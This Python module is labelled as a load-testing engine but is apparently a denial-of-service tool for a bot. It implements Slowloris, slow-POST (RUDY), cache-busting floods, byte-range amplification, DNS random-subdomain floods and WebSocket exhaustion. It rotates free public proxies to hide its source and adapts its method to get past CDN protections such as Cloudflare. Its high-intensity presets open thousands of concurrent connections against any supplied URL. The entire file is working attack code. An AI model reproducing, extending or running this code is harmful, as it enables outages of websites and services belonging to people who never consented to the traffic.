import asyncio
import base64
import random
import socket
import time
import ssl
import string
import logging
from dataclasses import dataclass, field
from urllib.parse import urlparse
import aiohttp

from bot.utils.protection_bypass import (
    get_random_headers,
    detect_protection,
    human_jitter,
    get_spoof_ip,
)

logger = logging.getLogger(__name__)

SLOWLORIS_HEADERS = [
    "X-a: {}\r\n",
    "X-b: {}\r\n",
    "X-c: {}\r\n",
    "Keep-Alive: {}\r\n",
    "X-Forwarded-For: {}\r\n",
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]

_RESERVOIR_MAX = 8000


# ─── Reservoir sampler (fixes memory leak) ───────────────────────────────────

class ReservoirSampler:
    """Keeps a fixed-size random sample; O(1) memory regardless of input size."""
    def __init__(self, max_size: int = _RESERVOIR_MAX):
        self._max = max_size
        self._data: list[float] = []
        self._count = 0

    def add(self, value: float):
        self._count += 1
        if len(self._data) < self._max:
            self._data.append(value)
        else:
            idx = random.randint(0, self._count - 1)
            if idx < self._max:
                self._data[idx] = value

    @property
    def data(self) -> list[float]:
        return self._data

    @property
    def count(self) -> int:
        return self._count


# ─── Proxy Manager ────────────────────────────────────────────────────────────

class ProxyManager:
    """Fetches, validates and rotates free HTTP proxies to distribute source IPs."""

    def __init__(self):
        self._raw: list[str] = []
        self._good: list[str] = []
        self._last_fetch: float = 0
        self._fetching = False
        self._lock = asyncio.Lock()

    async def _fetch_raw(self) -> list[str]:
        proxies: set[str] = set()
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(connector=connector) as s:
                for src in PROXY_SOURCES:
                    try:
                        async with s.get(
                            src,
                            timeout=aiohttp.ClientTimeout(total=10),
                            headers={"User-Agent": "Mozilla/5.0"},
                        ) as resp:
                            text = await resp.text()
                            for line in text.splitlines():
                                line = line.strip()
                                if line and ":" in line:
                                    proxies.add(line)
                    except Exception:
                        pass
        finally:
            await connector.close()
        return list(proxies)

    async def _validate_one(self, proxy: str, test_url: str = "http://httpbin.org/ip") -> bool:
        try:
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=conn) as s:
                async with s.get(
                    test_url,
                    proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=6),
                    headers=get_random_headers(),
                ) as resp:
                    return resp.status < 500
        except Exception:
            return False
        finally:
            await conn.close()

    async def refresh(self, validate_n: int = 40):
        """Fetch fresh proxy list and validate a batch of them."""
        async with self._lock:
            if self._fetching:
                return
            self._fetching = True

        try:
            raw = await self._fetch_raw()
            random.shuffle(raw)
            sample = raw[:validate_n]
            tasks = [asyncio.create_task(self._validate_one(p)) for p in sample]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            good = [p for p, ok in zip(sample, results) if ok is True]
            async with self._lock:
                self._good = good
                self._raw = raw
                self._last_fetch = time.monotonic()
            logger.info("ProxyManager: %d valid proxies out of %d fetched", len(good), len(raw))
        except Exception as e:
            logger.warning("ProxyManager refresh error: %s", e)
        finally:
            async with self._lock:
                self._fetching = False

    def get(self) -> str | None:
        """Return a random validated proxy, or a random raw one if none validated."""
        if self._good:
            return f"http://{random.choice(self._good)}"
        if self._raw:
            return f"http://{random.choice(self._raw)}"
        return None

    @property
    def ready(self) -> bool:
        return bool(self._good or self._raw)


# Shared global instance (refreshed once per test run)
_proxy_mgr = ProxyManager()


# ─── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class StressProfile:
    target_url: str
    duration: int = 60
    concurrency: int = 50
    max_rps: int = 100
    mode: str = "lite"
    method_type: str = "auto"
    methods: list = field(default_factory=lambda: ["GET"])
    timeout: float = 5.0
    use_proxies: bool = False
    pool_sessions: int = 1


@dataclass
class TrafficResult:
    total_requests: int = 0
    success: int = 0
    failed: int = 0
    _sampler: ReservoirSampler = field(default_factory=ReservoirSampler)
    status_codes: dict = field(default_factory=dict)
    rps_timeline: list = field(default_factory=list)
    protection_info: dict = field(default_factory=dict)
    elapsed: float = 0.0
    session_cookies_used: int = 0
    error_breakdown: dict = field(default_factory=dict)
    proxy_count: int = 0

    def add_latency(self, ms: float):
        self._sampler.add(ms)

    @property
    def latencies(self) -> list[float]:
        return self._sampler.data

    @property
    def rps(self) -> float:
        return round(self.total_requests / self.elapsed, 2) if self.elapsed > 0 else 0

    @property
    def success_rate(self) -> float:
        return round(self.success / self.total_requests * 100, 1) if self.total_requests else 0

    @property
    def p95(self) -> float:
        if not self._sampler.data:
            return 0
        s = sorted(self._sampler.data)
        return round(s[int(len(s) * 0.95)], 2)

    @property
    def p99(self) -> float:
        if not self._sampler.data:
            return 0
        s = sorted(self._sampler.data)
        return round(s[min(int(len(s) * 0.99), len(s) - 1)], 2)

    @property
    def avg_latency(self) -> float:
        d = self._sampler.data
        return round(sum(d) / len(d), 2) if d else 0


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _bust_url(url: str) -> str:
    sep = "&" if "?" in url else "?"
    rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"{url}{sep}_={rnd}&t={int(time.time())}&r={random.random():.8f}"


def _random_payload() -> bytes:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    length = random.randint(256, 4096)
    return ("&".join(
        f"{''.join(random.choices(chars, k=random.randint(4, 8)))}="
        f"{''.join(random.choices(chars, k=random.randint(8, 32)))}"
        for _ in range(random.randint(8, 20))
    )).encode()


def _parse_host_port(url: str) -> tuple[str, int, bool]:
    if url.startswith("https://"):
        p = urlparse(url)
        return p.hostname, p.port or 443, True
    elif url.startswith("http://"):
        p = urlparse(url)
        return p.hostname, p.port or 80, False
    else:
        p = urlparse("http://" + url)
        return p.hostname or url.split("/")[0], p.port or 80, False


def _make_session(concurrency: int, force_close: bool = False, proxy: str | None = None) -> aiohttp.ClientSession:
    connector = aiohttp.TCPConnector(
        limit=concurrency,
        ssl=False,
        ttl_dns_cache=300,
        force_close=force_close,
        enable_cleanup_closed=True,
        keepalive_timeout=30,
    )
    return aiohttp.ClientSession(connector=connector)


# ─── Worker ───────────────────────────────────────────────────────────────────

class TrafficWorker:
    def __init__(self, profile: StressProfile):
        self.profile = profile
        self._result = TrafficResult()
        self._stop_event = asyncio.Event()
        self._cookie_pool: list[dict] = []
        self._lock = asyncio.Lock()

    # ── single HTTP request ────────────────────────────────────────────────

    async def _single_request(
        self,
        session: aiohttp.ClientSession,
        protection_checked: list,
        proxy: str | None = None,
    ):
        url = _bust_url(self.profile.target_url)
        method = random.choice(self.profile.methods)
        headers = get_random_headers()

        cookies = None
        if self.profile.mode in ("pro", "flood") and self._cookie_pool:
            async with self._lock:
                cookies = random.choice(self._cookie_pool)

        data = None
        if method == "POST":
            data = _random_payload()
            headers["Content-Type"] = random.choice([
                "application/x-www-form-urlencoded",
                "application/json",
                "multipart/form-data",
            ])

        t0 = time.monotonic()
        try:
            kwargs: dict = dict(
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                allow_redirects=True,
                ssl=False,
            )
            if cookies:
                kwargs["cookies"] = cookies
            if data:
                kwargs["data"] = data
            if proxy:
                kwargs["proxy"] = proxy

            async with session.request(method, url, **kwargs) as resp:
                await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                ok = resp.status < 500

                async with self._lock:
                    self._result.total_requests += 1
                    self._result.add_latency(elapsed_ms)
                    key = str(resp.status)
                    self._result.status_codes[key] = self._result.status_codes.get(key, 0) + 1
                    if ok:
                        self._result.success += 1
                    else:
                        self._result.failed += 1

                    if not protection_checked and self.profile.mode in ("pro", "flood"):
                        info = detect_protection(dict(resp.headers))
                        if info.get("detected"):
                            self._result.protection_info = info
                            if info.get("provider") == "Cloudflare":
                                self.profile.method_type = "cache_bust"
                                self.profile.timeout = max(self.profile.timeout, 6.0)
                                self.profile.concurrency = min(self.profile.concurrency, 200)
                                if resp.cookies:
                                    cf_cookies = {k: v.value for k, v in resp.cookies.items()}
                                    if cf_cookies not in self._cookie_pool:
                                        self._cookie_pool.append(cf_cookies)
                        protection_checked.append(True)

                    if resp.cookies:
                        cookie_dict = {k: v.value for k, v in resp.cookies.items()}
                        if cookie_dict and cookie_dict not in self._cookie_pool:
                            self._cookie_pool.append(cookie_dict)
                            if len(self._cookie_pool) > 50:
                                self._cookie_pool.pop(0)
                            self._result.session_cookies_used += 1

        except asyncio.TimeoutError:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.add_latency(elapsed_ms)
                self._result.status_codes["timeout"] = self._result.status_codes.get("timeout", 0) + 1
                self._result.error_breakdown["timeout"] = self._result.error_breakdown.get("timeout", 0) + 1
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.add_latency(elapsed_ms)
                err = type(e).__name__
                self._result.status_codes["0"] = self._result.status_codes.get("0", 0) + 1
                self._result.error_breakdown[err] = self._result.error_breakdown.get(err, 0) + 1

    # ── SSL-capable Slowloris ──────────────────────────────────────────────

    async def _slowloris_worker(self, host: str, port: int, is_ssl: bool):
        path = urlparse(self.profile.target_url).path or "/"
        while not self._stop_event.is_set():
            t0 = time.monotonic()
            reader = writer = None
            try:
                ssl_ctx = None
                if is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_ctx),
                    timeout=8,
                )

                init = (
                    f"GET {path}?{random.randint(1000, 9999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {get_random_headers().get('User-Agent', 'Mozilla/5.0')}\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Connection: keep-alive\r\n"
                ).encode()
                writer.write(init)
                await writer.drain()

                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.success += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes["slowloris"] = self._result.status_codes.get("slowloris", 0) + 1

                keep_alive_until = time.monotonic() + random.uniform(15, 45)
                while not self._stop_event.is_set() and time.monotonic() < keep_alive_until:
                    hdr = f"X-{random.choice(string.ascii_uppercase)}: {random.randint(1, 9999)}\r\n"
                    writer.write(hdr.encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 12))

            except Exception as e:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.failed += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.error_breakdown["slowloris_err"] = self._result.error_breakdown.get("slowloris_err", 0) + 1
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

    # ── RUDY (slow POST) ───────────────────────────────────────────────────

    async def _rudy_worker(self, session: aiohttp.ClientSession, proxy: str | None = None):
        t0 = time.monotonic()
        try:
            body_size = random.randint(1024 * 100, 1024 * 500)
            headers = get_random_headers()
            headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(body_size),
                "Connection": "keep-alive",
            })

            async def slow_gen():
                sent = 0
                while sent < body_size and not self._stop_event.is_set():
                    chunk = random.randint(1, 10)
                    yield b"a" * chunk
                    sent += chunk
                    await asyncio.sleep(random.uniform(8, 15))

            kwargs: dict = dict(
                headers=headers,
                data=slow_gen(),
                timeout=aiohttp.ClientTimeout(total=300),
                ssl=False,
            )
            if proxy:
                kwargs["proxy"] = proxy

            async with session.post(self.profile.target_url, **kwargs) as resp:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.success += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes["rudy"] = self._result.status_codes.get("rudy", 0) + 1

        except Exception:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.add_latency(elapsed_ms)
                self._result.error_breakdown["rudy_err"] = self._result.error_breakdown.get("rudy_err", 0) + 1

    # ── Cache-bust flood ───────────────────────────────────────────────────

    async def _cache_buster_request(self, session: aiohttp.ClientSession, proxy: str | None = None):
        rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
        url = f"{self.profile.target_url}?nocache={rnd}&t={int(time.time())}&r={random.random():.10f}&s={get_spoof_ip()}"
        headers = get_random_headers()
        headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        headers["Pragma"] = "no-cache"
        headers["If-None-Match"] = f'"{rnd}"'
        headers["If-Modified-Since"] = "Thu, 01 Jan 1970 00:00:00 GMT"
        t0 = time.monotonic()
        try:
            kwargs: dict = dict(
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                ssl=False,
            )
            if proxy:
                kwargs["proxy"] = proxy
            async with session.get(url, **kwargs) as resp:
                await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    if resp.status < 500:
                        self._result.success += 1
                    else:
                        self._result.failed += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes[str(resp.status)] = self._result.status_codes.get(str(resp.status), 0) + 1
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.add_latency(elapsed_ms)
                self._result.error_breakdown[type(e).__name__] = self._result.error_breakdown.get(type(e).__name__, 0) + 1

    # ── Range amplification ────────────────────────────────────────────────
    # Forces server to read file from disk / DB multiple times with byte ranges

    async def _range_amplify_request(self, session: aiohttp.ClientSession, proxy: str | None = None):
        headers = get_random_headers()
        # Request many small overlapping byte ranges — server must seek & read each
        ranges = []
        for _ in range(random.randint(8, 20)):
            start = random.randint(0, 50000)
            end = start + random.randint(64, 512)
            ranges.append(f"{start}-{end}")
        headers["Range"] = "bytes=" + ",".join(ranges)
        headers["Accept-Ranges"] = "bytes"
        t0 = time.monotonic()
        try:
            kwargs: dict = dict(
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                ssl=False,
            )
            if proxy:
                kwargs["proxy"] = proxy
            async with session.get(self.profile.target_url, **kwargs) as resp:
                await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    if resp.status < 500:
                        self._result.success += 1
                    else:
                        self._result.failed += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes[str(resp.status)] = self._result.status_codes.get(str(resp.status), 0) + 1
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.add_latency(elapsed_ms)
                self._result.error_breakdown[type(e).__name__] = self._result.error_breakdown.get(type(e).__name__, 0) + 1

    # ── DNS flood ──────────────────────────────────────────────────────────
    # Floods DNS resolver with unique random subdomain queries

    async def _dns_flood_worker(self):
        loop = asyncio.get_event_loop()
        parsed = urlparse(self.profile.target_url)
        base_domain = parsed.hostname or self.profile.target_url
        while not self._stop_event.is_set():
            rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=14))
            subdomain = f"{rnd}.{base_domain}"
            t0 = time.monotonic()
            try:
                await asyncio.wait_for(
                    loop.run_in_executor(None, socket.gethostbyname, subdomain),
                    timeout=3.0,
                )
            except Exception:
                pass
            finally:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes["dns"] = self._result.status_codes.get("dns", 0) + 1

    # ── WebSocket flood ────────────────────────────────────────────────────
    # Opens and holds many WebSocket connections to exhaust server capacity

    async def _websocket_worker(self):
        parsed = urlparse(self.profile.target_url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme in ("https",) else 80)
        is_ssl_ws = parsed.scheme in ("https", "wss")
        path = parsed.path or "/"

        while not self._stop_event.is_set():
            t0 = time.monotonic()
            writer = None
            try:
                ssl_ctx = None
                if is_ssl_ws:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_ctx),
                    timeout=8,
                )
                ws_key = base64.b64encode(random.randbytes(16)).decode()
                handshake = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"User-Agent: {get_random_headers()['User-Agent']}\r\n"
                    f"\r\n"
                )
                writer.write(handshake.encode())
                await writer.drain()
                await asyncio.wait_for(reader.read(1024), timeout=5)
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.success += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.status_codes["websocket"] = self._result.status_codes.get("websocket", 0) + 1
                # Hold connection open and send pings
                hold_until = time.monotonic() + random.uniform(20, 60)
                while not self._stop_event.is_set() and time.monotonic() < hold_until:
                    writer.write(b"\x89\x00")  # WebSocket ping frame
                    await writer.drain()
                    await asyncio.sleep(random.uniform(10, 20))
            except Exception:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.failed += 1
                    self._result.add_latency(elapsed_ms)
                    self._result.error_breakdown["ws_err"] = self._result.error_breakdown.get("ws_err", 0) + 1
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

    # ── RPS sampler ────────────────────────────────────────────────────────

    async def _rps_sampler(self):
        prev = 0
        while not self._stop_event.is_set():
            await asyncio.sleep(1)
            cur = self._result.total_requests
            self._result.rps_timeline.append(cur - prev)
            prev = cur

    # ── Main run (multi-session pool) ──────────────────────────────────────

    async def run(self) -> TrafficResult:
        p = self.profile
        method_type = p.method_type
        start = time.monotonic()
        sampler_task = asyncio.create_task(self._rps_sampler())
        protection_checked: list = []

        host, port, is_ssl = _parse_host_port(p.target_url)

        # Start proxy refresh in background if proxies enabled
        proxy_task = None
        if p.use_proxies and not _proxy_mgr.ready:
            proxy_task = asyncio.create_task(_proxy_mgr.refresh(validate_n=30))

        # Build pool of sessions for higher throughput
        n_sessions = max(1, p.pool_sessions)
        per_session = max(10, p.concurrency // n_sessions)

        sessions: list[aiohttp.ClientSession] = []
        for _ in range(n_sessions):
            sessions.append(_make_session(per_session, force_close=(p.mode == "flood")))

        def _get_session() -> aiohttp.ClientSession:
            return random.choice(sessions)

        def _get_proxy() -> str | None:
            if p.use_proxies and _proxy_mgr.ready:
                return _proxy_mgr.get()
            return None

        pending: set[asyncio.Task] = set()

        try:
            while time.monotonic() - start < p.duration:
                if self._stop_event.is_set():
                    break

                proxy = _get_proxy()
                sess = _get_session()
                active = len(pending)

                if method_type == "slowloris":
                    if active < p.concurrency:
                        t = asyncio.create_task(self._slowloris_worker(host, port, is_ssl))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.1)

                elif method_type == "rudy":
                    if active < min(p.concurrency, 20):
                        t = asyncio.create_task(self._rudy_worker(sess, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.5)

                elif method_type == "cache_bust":
                    slots = p.concurrency - active
                    for _ in range(min(slots, 80)):
                        t = asyncio.create_task(self._cache_buster_request(sess, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.005)

                elif method_type == "range_amplify":
                    slots = p.concurrency - active
                    for _ in range(min(slots, 80)):
                        t = asyncio.create_task(self._range_amplify_request(sess, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.005)

                elif method_type == "dns_flood":
                    if active < p.concurrency:
                        t = asyncio.create_task(self._dns_flood_worker())
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.05)

                elif method_type == "websocket":
                    if active < min(p.concurrency, 200):
                        t = asyncio.create_task(self._websocket_worker())
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.1)

                elif method_type == "mixed":
                    # 40% cache-bust + 30% range-amplify + 30% regular flood
                    slots = p.concurrency - active
                    for _ in range(min(slots, 80)):
                        r = random.random()
                        if r < 0.40:
                            t = asyncio.create_task(self._cache_buster_request(sess, proxy))
                        elif r < 0.70:
                            t = asyncio.create_task(self._range_amplify_request(sess, proxy))
                        else:
                            t = asyncio.create_task(self._single_request(sess, protection_checked, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.005)

                elif p.mode == "flood":
                    slots = p.concurrency - active
                    if slots > 0:
                        for _ in range(min(slots, 100)):
                            t = asyncio.create_task(self._single_request(sess, protection_checked, proxy))
                            pending.add(t)
                            t.add_done_callback(pending.discard)
                    await asyncio.sleep(0.003)

                elif p.mode == "pro":
                    slots = p.concurrency - active
                    for _ in range(min(slots, 50)):
                        t = asyncio.create_task(self._single_request(sess, protection_checked, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    await human_jitter(2, 10)

                else:
                    # lite
                    slots = p.concurrency - active
                    for _ in range(min(slots, 30)):
                        t = asyncio.create_task(self._single_request(sess, protection_checked, proxy))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                    interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
                    await asyncio.sleep(interval)

            if pending:
                await asyncio.gather(*pending, return_exceptions=True)

        finally:
            self._stop_event.set()
            sampler_task.cancel()
            try:
                await sampler_task
            except asyncio.CancelledError:
                pass

            if proxy_task and not proxy_task.done():
                proxy_task.cancel()
                try:
                    await proxy_task
                except asyncio.CancelledError:
                    pass

            for s in sessions:
                try:
                    await s.close()
                except Exception:
                    pass

        if _proxy_mgr.ready:
            self._result.proxy_count = len(_proxy_mgr._good or _proxy_mgr._raw)

        self._result.elapsed = time.monotonic() - start
        return self._result


# ─── Public API ───────────────────────────────────────────────────────────────

async def run_load_test(profile: StressProfile, progress_cb=None) -> TrafficResult:
    worker = TrafficWorker(profile)

    if progress_cb:
        async def _progress_loop():
            t0 = time.monotonic()
            while not worker._stop_event.is_set():
                await asyncio.sleep(10)
                if worker._stop_event.is_set():
                    break
                elapsed = time.monotonic() - t0
                remaining = max(0, profile.duration - elapsed)
                try:
                    await progress_cb(worker._result, elapsed, remaining)
                except Exception:
                    pass
        asyncio.create_task(_progress_loop())

    return await worker.run()


async def auto_detect_method(target_url: str) -> str:
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(
                target_url,
                headers=get_random_headers(),
                timeout=aiohttp.ClientTimeout(total=8),
                allow_redirects=True,
                ssl=False,
            ) as resp:
                headers = dict(resp.headers)
                server = headers.get("Server", "").lower()
                via = headers.get("Via", "").lower()
                cf = headers.get("CF-RAY", "")
                akamai = headers.get("X-Check-Cacheable", "")
                powered = headers.get("X-Powered-By", "").lower()
                connection = headers.get("Connection", "").lower()

                if cf or "cloudflare" in server:
                    return "cache_bust"
                if akamai or "akamai" in via:
                    return "cache_bust"
                if "fastly" in via or "fastly" in headers.get("X-Served-By", "").lower():
                    return "cache_bust"
                if "keep-alive" in connection:
                    return "slowloris"
                if "php" in powered or "apache" in server:
                    return "rudy"
                if "nginx" in server:
                    return "mixed"
                return "http_flood"
    except Exception:
        return "http_flood"


def build_stress_profile(
    target_url: str,
    mode: str = "lite",
    duration: int = 60,
    concurrency: int = 50,
    intensity: str = "medium",
    method_type: str = "auto",
    use_proxies: bool = False,
) -> StressProfile:

    if mode == "lite":
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 60),
            concurrency=50,
            max_rps=300,
            mode="lite",
            method_type=method_type if method_type != "auto" else "http_flood",
            methods=["GET", "HEAD"],
            timeout=6.0,
            use_proxies=False,
            pool_sessions=1,
        )

    if mode == "flood":
        rps_map  = {"low": 2000,   "medium": 5000,  "high": 10000, "ultra": 20000}
        conc_map = {"low": 500,    "medium": 1500,  "high": 3000,  "ultra": 5000}
        sess_map = {"low": 2,      "medium": 4,     "high": 6,     "ultra": 8}
        flood_method = method_type if method_type != "auto" else "mixed"
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 300),
            concurrency=conc_map.get(intensity, 1500),
            max_rps=rps_map.get(intensity, 5000),
            mode="flood",
            method_type=flood_method,
            methods=["GET", "POST", "HEAD", "OPTIONS"],
            timeout=2.0,
            use_proxies=use_proxies,
            pool_sessions=sess_map.get(intensity, 4),
        )

    # pro
    rps_map  = {"low": 800,  "medium": 2000,  "high": 5000,  "ultra": 10000}
    conc_map = {"low": 200,  "medium": 600,   "high": 1500,  "ultra": 3000}
    sess_map = {"low": 1,    "medium": 2,     "high": 4,     "ultra": 6}
    pro_method = method_type if method_type != "auto" else "http_flood"
    return StressProfile(
        target_url=target_url,
        duration=duration,
        concurrency=conc_map.get(intensity, 600),
        max_rps=rps_map.get(intensity, 2000),
        mode="pro",
        method_type=pro_method,
        methods=["GET", "POST", "HEAD"],
        timeout=4.0,
        use_proxies=use_proxies,
        pool_sessions=sess_map.get(intensity, 2),
    )
